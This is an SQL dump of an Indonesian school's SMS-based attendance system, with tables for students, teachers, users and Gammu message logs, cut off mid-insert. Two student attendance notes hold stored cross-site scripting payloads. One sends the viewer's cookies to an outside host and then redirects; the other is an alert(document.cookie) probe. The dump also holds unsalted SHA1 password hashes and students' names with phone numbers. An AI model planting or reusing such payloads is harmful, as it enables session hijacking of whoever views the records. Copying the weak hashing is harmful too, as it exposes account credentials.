-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Waktu pembuatan: 27 Des 2019 pada 07.05
-- Versi server: 10.3.16-MariaDB
-- Versi PHP: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `absensi_getway`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_absen_siswa`
--

CREATE TABLE `as_absen_siswa` (
  `id_absen_siswa` int(11) NOT NULL,
  `nis` int(14) NOT NULL,
  `nama_siswa` varchar(255) NOT NULL,
  `id_pelajaran` int(11) NOT NULL,
  `id_kelas` int(11) NOT NULL,
  `keterangan` enum('Hadir','Izin','Alpa','Sakit') NOT NULL,
  `catatan_siswa` text NOT NULL,
  `id_jam_pelajaran` int(11) NOT NULL,
  `tanggal_masuk` date NOT NULL,
  `konfirmasi_walikelas` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_absen_siswa`
--

INSERT INTO `as_absen_siswa` (`id_absen_siswa`, `nis`, `nama_siswa`, `id_pelajaran`, `id_kelas`, `keterangan`, `catatan_siswa`, `id_jam_pelajaran`, `tanggal_masuk`, `konfirmasi_walikelas`) VALUES
(26, 17060051, 'JAKA KERISNA', 4, 3, 'Hadir', '  \"><script type=\"text/javascript\">\r\ndocument.location=\"http://caraxss.000webhostapp.com/xss/cookie.php?cookie=\"+\r\ndocument.cookie;location=\"https://www.google.com\"\r\n</script>', 1, '2019-11-29', 0),
(27, 17060050, 'IQBAL ALQODRI', 4, 3, 'Hadir', '  ', 1, '2019-11-29', 0),
(28, 17060050, 'IQBAL ALQODRI', 4, 3, 'Hadir', '  ', 2, '2019-11-29', 0),
(29, 17060050, 'IQBAL ALQODRI', 4, 3, 'Hadir', '  ', 2, '2019-11-28', 0),
(30, 17060051, 'JAKA KERISNA', 4, 3, 'Hadir', '  \"><script>alert(document.cookie)</script>', 1, '2019-11-23', 0),
(31, 17060050, 'IQBAL ALQODRI', 4, 3, 'Hadir', '  ', 1, '2019-11-23', 0),
(32, 17060051, 'JAKA KERISNA', 4, 3, 'Hadir', '  ', 1, '2019-11-30', 0),
(33, 17060050, 'IQBAL ALQODRI', 4, 3, 'Hadir', '  ', 1, '2019-11-30', 0);

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_guru`
--

CREATE TABLE `as_guru` (
  `id_guru` int(11) NOT NULL,
  `id_users` int(11) NOT NULL,
  `id_pelajaran` int(11) NOT NULL,
  `nip` int(11) NOT NULL,
  `nama_guru` varchar(255) NOT NULL,
  `jenis_kelamin` enum('L','P') NOT NULL,
  `alamat` text NOT NULL,
  `tanggal_lahir` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_guru`
--

INSERT INTO `as_guru` (`id_guru`, `id_users`, `id_pelajaran`, `nip`, `nama_guru`, `jenis_kelamin`, `alamat`, `tanggal_lahir`) VALUES
(3, 0, 3, 787878, 'Guru bahasa indonesia', 'P', '-', '2002-11-27'),
(4, 0, 4, 1234567890, 'Guru Matematika', 'L', '-', '1999-11-27'),
(6, 0, 4, 867676, 'nub', 'L', '-', '2019-12-27');

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_jam_pelajaran`
--

CREATE TABLE `as_jam_pelajaran` (
  `id_jam_pelajaran` int(11) NOT NULL,
  `nama_jam` varchar(255) NOT NULL,
  `waktu` time NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_jam_pelajaran`
--

INSERT INTO `as_jam_pelajaran` (`id_jam_pelajaran`, `nama_jam`, `waktu`) VALUES
(1, '1', '07:00:00'),
(2, '2', '12:00:00');

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_jurusan`
--

CREATE TABLE `as_jurusan` (
  `id_jurusan` int(11) NOT NULL,
  `jurusan` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_kelas`
--

CREATE TABLE `as_kelas` (
  `id_kelas` int(11) NOT NULL,
  `kelas` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_kelas`
--

INSERT INTO `as_kelas` (`id_kelas`, `kelas`) VALUES
(3, 'XII.RPL'),
(4, 'XI.RPL');

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_level`
--

CREATE TABLE `as_level` (
  `id_level` int(11) NOT NULL,
  `level` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_level`
--

INSERT INTO `as_level` (`id_level`, `level`) VALUES
(1, 'Admin'),
(2, 'Guru'),
(3, 'Wali Kelas');

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_notifikasi`
--

CREATE TABLE `as_notifikasi` (
  `id_notifikasi` int(11) NOT NULL,
  `id_kelas` int(11) NOT NULL,
  `id_jam_pelajaran` int(11) NOT NULL,
  `id_pelajaran` int(11) NOT NULL,
  `tanggal` date NOT NULL,
  `comment_status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_notifikasi`
--

INSERT INTO `as_notifikasi` (`id_notifikasi`, `id_kelas`, `id_jam_pelajaran`, `id_pelajaran`, `tanggal`, `comment_status`) VALUES
(7, 2, 1, 2, '2019-11-13', 1),
(8, 2, 2, 2, '2019-11-13', 1),
(9, 3, 1, 3, '2019-11-13', 1),
(10, 3, 2, 4, '2019-11-13', 1),
(11, 3, 1, 4, '2019-11-29', 1),
(12, 3, 1, 0, '2019-11-29', 1),
(13, 3, 1, 0, '2019-11-29', 1),
(14, 3, 1, 4, '2019-11-29', 1),
(15, 3, 2, 4, '2019-11-29', 1),
(16, 3, 2, 4, '2019-11-28', 1),
(17, 3, 1, 4, '2019-11-23', 1),
(18, 3, 1, 4, '2019-11-30', 1);

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_pelajaran`
--

CREATE TABLE `as_pelajaran` (
  `id_pelajaran` int(11) NOT NULL,
  `pelajaran` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_pelajaran`
--

INSERT INTO `as_pelajaran` (`id_pelajaran`, `pelajaran`) VALUES
(4, 'MATEMATIKA');

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_siswa`
--

CREATE TABLE `as_siswa` (
  `id_siswa` int(11) NOT NULL,
  `id_kelas` int(11) NOT NULL,
  `nis` int(13) NOT NULL,
  `nama_siswa` varchar(255) NOT NULL,
  `jenis_kelamin` enum('L','P') NOT NULL,
  `alamat` text NOT NULL,
  `tanggal_lahir` date NOT NULL,
  `nomor_telpon` varchar(15) NOT NULL,
  `nama_ayah` varchar(255) NOT NULL,
  `pekerjaan_ayah` varchar(255) NOT NULL,
  `nama_ibu` varchar(255) NOT NULL,
  `pekerjaan_ibu` varchar(255) NOT NULL,
  `alamat_ortu` text NOT NULL,
  `nomor_telpon_ortu` varchar(15) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_siswa`
--

INSERT INTO `as_siswa` (`id_siswa`, `id_kelas`, `nis`, `nama_siswa`, `jenis_kelamin`, `alamat`, `tanggal_lahir`, `nomor_telpon`, `nama_ayah`, `pekerjaan_ayah`, `nama_ibu`, `pekerjaan_ibu`, `alamat_ortu`, `nomor_telpon_ortu`) VALUES
(8, 3, 17060051, 'JAKA KERISNA', 'L', '-', '2002-11-27', '', '-', '-', '-', '-', '-', '+6282282175994'),
(9, 3, 17060050, 'IQBAL ALQODRI', 'L', '-', '2002-11-27', '', '-', '-', '-', '-', '-', '+6282282175993');

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_users`
--

CREATE TABLE `as_users` (
  `id_users` int(11) NOT NULL,
  `id_guru` int(11) NOT NULL,
  `id_wali_kelas` int(11) NOT NULL,
  `userFullname` varchar(255) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `foto` varchar(255) NOT NULL,
  `id_level` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_users`
--

INSERT INTO `as_users` (`id_users`, `id_guru`, `id_wali_kelas`, `userFullname`, `username`, `password`, `foto`, `id_level`) VALUES
(1, 0, 0, 'ADMIN', 'admin', '40bd001563085fc35165329ea1ff5c5ecbdbbeef', 'alqodri.jpg', 1),
(30, 0, 7, 'Wali kelas kelas xii rpl', 'WALI_KELAS', '40bd001563085fc35165329ea1ff5c5ecbdbbeef', 'p.jpg', 3),
(31, 3, 0, 'Guru bahasa indonesia', 'guru', '40bd001563085fc35165329ea1ff5c5ecbdbbeef', 'p.jpg', 2),
(32, 4, 0, 'Guru Matematika', 'Guru_matematika', '40bd001563085fc35165329ea1ff5c5ecbdbbeef', 'p.jpg', 2),
(35, 0, 0, 'kjkj', 'lk', '9b20e9ff78b04ea36084e818be32bd1148855d55', '', 1),
(38, 6, 0, 'nub', 'jgh', 'd0b69112e1c3b5e075514752130c87978ccf4fe1', 'p.jpg', 2);

-- --------------------------------------------------------

--
-- Struktur dari tabel `as_wali_kelas`
--

CREATE TABLE `as_wali_kelas` (
  `id_wali_kelas` int(11) NOT NULL,
  `id_guru` int(11) NOT NULL,
  `id_kelas` int(11) NOT NULL,
  `nama_guru` varchar(255) NOT NULL,
  `jenis_kelamin` varchar(255) NOT NULL,
  `alamat` text NOT NULL,
  `no_tel` varchar(15) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `as_wali_kelas`
--

INSERT INTO `as_wali_kelas` (`id_wali_kelas`, `id_guru`, `id_kelas`, `nama_guru`, `jenis_kelamin`, `alamat`, `no_tel`) VALUES
(7, 0, 3, 'Wali kelas kelas xii rpl', 'L', '-', '0822-');

-- --------------------------------------------------------

--
-- Struktur dari tabel `daemons`
--

CREATE TABLE `daemons` (
  `Start` text NOT NULL,
  `Info` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Struktur dari tabel `gammu`
--

CREATE TABLE `gammu` (
  `Version` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data untuk tabel `gammu`
--

INSERT INTO `gammu` (`Version`) VALUES
(11);

-- --------------------------------------------------------

--
-- Struktur dari tabel `inbox`
--

CREATE TABLE `inbox` (
  `UpdatedInDB` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `ReceivingDateTime` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `Text` text NOT NULL,
  `SenderNumber` varchar(20) NOT NULL DEFAULT '',
  `Coding` enum('Default_No_Compression','Unicode_No_Compression','8bit','Default_Compression','Unicode_Compression') NOT NULL DEFAULT 'Default_No_Compression',
  `UDH` text NOT NULL,
  `SMSCNumber` varchar(20) NOT NULL DEFAULT '',
  `Class` int(11) NOT NULL DEFAULT -1,
  `TextDecoded` text NOT NULL DEFAULT '',
  `ID` int(10) UNSIGNED NOT NULL,
  `RecipientID` text NOT NULL,
  `Processed` enum('false','true') NOT NULL DEFAULT 'false'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data untuk tabel `inbox`
--

INSERT INTO `inbox` (`UpdatedInDB`, `ReceivingDateTime`, `Text`, `SenderNumber`, `Coding`, `UDH`, `SMSCNumber`, `Class`, `TextDecoded`, `ID`, `RecipientID`, `Processed`) VALUES
('2019-11-13 08:22:51', '2019-11-13 08:22:48', '0041006200730065006E0020003100370030003600300030003500300020003100200032003000310039002D00310031002D00310033', '+6282282175993', 'Default_No_Compression', '', '+6281100400', -1, 'Absen 17060050 1 2019-11-13', 287, 'server', 'true'),
('2019-11-13 08:23:54', '2019-11-13 08:23:50', '0041006200730065006E0020003100370030003600300030003500310020003100200032003000310039002D00310031002D00310033', '+6282282175993', 'Default_No_Compression', '', '+6281100400', -1, 'Absen 17060051 1 2019-11-13', 288, 'server', 'true');

-- --------------------------------------------------------

--
-- Struktur dari tabel `outbox`
--

CREATE TABLE `outbox` (
  `UpdatedInDB` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `InsertIntoDB` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `SendingDateTime` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `Text` text DEFAULT NULL,
  `DestinationNumber` varchar(20) NOT NULL DEFAULT '',
  `Coding` enum('Default_No_Compression','Unicode_No_Compression','8bit','Default_Compression','Unicode_Compression') NOT NULL DEFAULT 'Default_No_Compression',
  `UDH` text DEFAULT NULL,
  `Class` int(11) DEFAULT -1,
  `TextDecoded` text NOT NULL DEFAULT '',
  `ID` int(10) UNSIGNED NOT NULL,
  `MultiPart` enum('false','true') DEFAULT 'false',
  `RelativeValidity` int(11) DEFAULT -1,
  `SenderID` varchar(255) DEFAULT NULL,
  `SendingTimeOut` timestamp NULL DEFAULT '0000-00-00 00:00:00',
  `DeliveryReport` enum('default','yes','no') DEFAULT 'default',
  `CreatorID` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Struktur dari tabel `outbox_multipart`
--

CREATE TABLE `outbox_multipart` (
  `Text` text DEFAULT NULL,
  `Coding` enum('Default_No_Compression','Unicode_No_Compression','8bit','Default_Compression','Unicode_Compression') NOT NULL DEFAULT 'Default_No_Compression',
  `UDH` text DEFAULT NULL,
  `Class` int(11) DEFAULT -1,
  `TextDecoded` text DEFAULT NULL,
  `ID` int(10) UNSIGNED NOT NULL DEFAULT 0,
  `SequencePosition` int(11) NOT NULL DEFAULT 1
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Struktur dari tabel `pbk`
--

CREATE TABLE `pbk` (
  `ID` int(11) NOT NULL,
  `GroupID` int(11) NOT NULL DEFAULT -1,
  `Name` text NOT NULL,
  `Number` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Struktur dari tabel `pbk_groups`
--

CREATE TABLE `pbk_groups` (
  `Name` text NOT NULL,
  `ID` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Struktur dari tabel `phones`
--

CREATE TABLE `phones` (
  `ID` text NOT NULL,
  `UpdatedInDB` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `InsertIntoDB` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `TimeOut` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `Send` enum('yes','no') NOT NULL DEFAULT 'no',
  `Receive` enum('yes','no') NOT NULL DEFAULT 'no',
  `IMEI` varchar(35) NOT NULL,
  `Client` text NOT NULL,
  `Battery` int(11) NOT NULL DEFAULT 0,
  `Signal` int(11) NOT NULL DEFAULT 0,
  `Sent` int(11) NOT NULL DEFAULT 0,
  `Received` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data untuk tabel `phones`
--

INSERT INTO `phones` (`ID`, `UpdatedInDB`, `InsertIntoDB`, `TimeOut`, `Send`, `Receive`, `IMEI`, `Client`, `Battery`, `Signal`, `Sent`, `Received`) VALUES
('server', '2019-11-13 08:25:50', '2019-11-13 01:50:18', '2019-11-13 08:26:00', 'yes', 'yes', '357653049589109ӯ', 'Gammu 1.28.90, Windows Server 2007, GCC 4.4, MinGW 3.13', 100, 57, 47, 36);

-- --------------------------------------------------------

--
-- Struktur dari tabel `sentitems`
--

CREATE TABLE `sentitems` (
  `UpdatedInDB` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `InsertIntoDB` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `SendingDateTime` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `DeliveryDateTime` timestamp NULL DEFAULT NULL,
  `Text` text NOT NULL,
  `DestinationNumber` varchar(20) NOT NULL DEFAULT '',
  `Coding` enum('Default_No_Compression','Unicode_No_Compression','8bit','Default_Compression','Unicode_Compression') NOT NULL DEFAULT 'Default_No_Compression',
  `UDH` text NOT NULL,
  `SMSCNumber` varchar(20) NOT NULL DEFAULT '',
  `Class` int(11) NOT NULL DEFAULT -1,
  `TextDecoded` text NOT NULL DEFAULT '',
  `ID` int(10) UNSIGNED NOT NULL DEFAULT 0,
  `SenderID` varchar(255) NOT NULL,
  `SequencePosition` int(11) NOT NULL DEFAULT 1,
  `Status` enum('SendingOK','SendingOKNoReport','SendingError','DeliveryOK','DeliveryFailed','DeliveryPending','DeliveryUnknown','Error') NOT NULL DEFAULT 'SendingOK',
  `StatusError` int(11) NOT NULL DEFAULT -1,
  `TPMR` int(11) NOT NULL DEFAULT -1,
  `RelativeValidity` int(11) NOT NULL DEFAULT -1,
  `CreatorID` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data untuk tabel `sentitems`
--

INSERT INTO `sentitems` (`UpdatedInDB`, `InsertIntoDB`, `SendingDateTime`, `DeliveryDateTime`, `Text`, `DestinationNumber`, `Coding`, `UDH`, `SMSCNumber`, `Class`, `TextDecoded`, `ID`, `SenderID`, `SequencePosition`, `Status`, `StatusError`, `TPMR`, `RelativeValidity`, `CreatorID`) VALUES
('2019-11-13 01:47:44', '0000-00-00 00:00:00', '2019-11-13 01:47:44', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 13 November 2019', 892, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-13 01:46:09', '0000-00-00 00:00:00', '2019-11-13 01:46:09', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Hadir ', 890, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-13 01:46:07', '0000-00-00 00:00:00', '2019-11-13 01:46:07', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E00200049007A0069006E0020', '+6282282175999', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Izin ', 891, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-13 01:43:05', '0000-00-00 00:00:00', '2019-11-13 01:43:05', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Hadir ', 888, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-13 01:43:04', '0000-00-00 00:00:00', '2019-11-13 01:43:04', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E00200049007A0069006E0020', '+6282282175999', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Izin ', 889, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-13 01:07:25', '0000-00-00 00:00:00', '2019-11-13 01:07:25', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', 'TELKOMSEL', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 885, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-13 01:06:23', '0000-00-00 00:00:00', '2019-11-13 01:06:23', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', 'TELKOMSEL', 'Default_No_Compression', '', '+002B003600320038003', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 884, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-12 10:40:24', '0000-00-00 00:00:00', '2019-11-12 10:40:24', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E0079006100200049007A0069006E002000200050006100640061002000540061006E006700670061006C0020003100320020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Izin  Pada Tanggal 12 November 2019', 874, 'server', 1, 'SendingOKNoReport', -1, 125, 255, 'Gammu .128.90'),
('2019-11-12 10:41:28', '0000-00-00 00:00:00', '2019-11-12 10:41:28', NULL, '0046006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 876, 'server', 1, 'SendingOKNoReport', -1, 126, 255, 'Gammu .128.90'),
('2019-11-12 19:07:17', '0000-00-00 00:00:00', '2019-11-12 19:07:17', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 13 November 2019', 878, 'server', 1, 'SendingOKNoReport', -1, 127, 255, 'Gammu .128.90'),
('2019-11-12 19:07:51', '0000-00-00 00:00:00', '2019-11-12 19:07:51', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 879, 'server', 1, 'SendingOKNoReport', -1, 128, 255, 'Gammu .128.90'),
('2019-11-12 19:09:25', '0000-00-00 00:00:00', '2019-11-12 19:09:25', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', 'TELKOMSEL', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 880, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-12 19:13:27', '0000-00-00 00:00:00', '2019-11-12 19:13:27', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Hadir ', 882, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-12 19:13:31', '0000-00-00 00:00:00', '2019-11-12 19:13:31', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Hadir ', 881, 'server', 1, 'SendingOKNoReport', -1, 131, 255, 'Gammu .128.90'),
('2019-11-13 01:50:21', '0000-00-00 00:00:00', '2019-11-13 01:50:21', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 893, 'server', 1, 'SendingOKNoReport', -1, 132, 255, 'Gammu .128.90'),
